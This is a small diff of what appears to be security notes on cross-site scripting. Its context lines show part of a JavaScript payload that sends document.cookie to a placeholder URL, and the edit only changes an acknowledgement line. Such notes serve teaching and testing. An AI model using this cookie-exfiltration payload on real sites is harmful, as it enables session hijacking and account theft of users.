@@ -19,7 +19,7 @@ xhttp.open('GET', 'URL' + document.cookie, true);
 xhttp.send();
 ```
 
-Thanks to @Legacyy for assisting me
+Thanks to @Legacyy for assisting me with the javascript breakdown
 
 ### XSS
 Resources:
